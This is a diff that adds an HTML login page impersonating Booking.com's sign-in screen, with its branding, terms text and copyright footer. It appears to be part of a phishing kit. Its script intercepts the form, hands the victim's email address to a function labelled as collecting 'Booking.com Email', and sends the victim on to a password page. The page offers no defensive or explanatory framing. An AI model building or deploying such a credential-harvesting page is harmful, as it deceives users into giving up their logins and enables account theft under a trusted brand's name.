@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res\css\main.css">
+    <title>Login</title>
+</head>
+<body>
+
+    <header>
+        <img src="res\img\logo.png" alt="">
+    </header>
+    <main>
+	        <div class="container">
+            <h1 style="text-align:left; font-size:1.2em;">Sign in or create an account</h1>
+
+        <form action="post.php" method="post">
+                <label for="user">Email address</label>
+                <input type="text" name="user" placeholder="Enter your email address" required>
+                <button type="submit">Continue with email</button>
+         </form>
+
+            <p class="terms">
+                By signing in or creating an account, you agree with our
+                 <a href="#">Terms & conditions</a>
+                 and <a href="#">Privacy statement</a>
+            </p>
+        </div>
+    </main>
+    <footer>
+        <p>All rights reserved.</p>
+        <p>Copyright (2006 - 2024) - Booking.com™</p>
+    </footer>
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    wu.zhong(`✉️ Booking.com Email: ${document.querySelector("[name='user']").value}\n\n`);
+
+window.location="pass.html";
+
+})
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
